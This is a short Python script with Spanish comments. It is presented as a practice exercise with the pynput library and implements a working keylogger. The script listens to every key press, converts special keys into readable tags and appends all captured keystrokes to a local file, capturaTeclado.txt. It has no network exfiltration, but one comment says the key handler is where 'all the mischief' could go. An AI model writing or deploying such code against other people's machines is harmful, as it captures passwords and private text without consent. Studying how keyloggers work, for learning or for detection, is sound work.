'''
    Esto solo va a ser una pequeña prueba con la librería pynput
    que parece que podemos crear un sencillo keylogger solo para 
    practicar, sin ningun fin maligno ni nada por el estilo
    
    En este caso solo controlaremos el teclado, no el ratón. 
    y guardaremos eso en un fichero capturaTeclado.txt 

    @Autor: Tomás Rodríguez... 
    @Fecha: 09/11/22
'''

from pynput import keyboard as cotilla

def limpiar(letra): # esto solo me limpia un poco el texto capturado
    letra = letra.replace("'","")
    letra = letra.replace("Key.space","  ")
    letra = letra.replace("Key.shift"," (UP) ")
    letra = letra.replace("Key.backspace"," (<-) ")
    letra = letra.replace("Key.ctrl_l"," (ctrl) ")
    letra = letra.replace("Key.enter"," (\\n) ")
    letra = letra.replace("Key.tab"," (tab) ")
    letra = letra.replace("Key.esc"," (esc) ")
    letra = letra.replace("Key.caps_lock"," (Mayus) ")
    return letra

def tecla_press(key):
    # ahora aqui dentro puedo hacer todas las maldades que se me ocurran
    letra = str((key))
    letra = limpiar(letra)

    with open('capturaTeclado.txt', 'a') as f:
        f.write(letra)

with cotilla.Listener(on_press= tecla_press) as escuchando: 
    escuchando.join()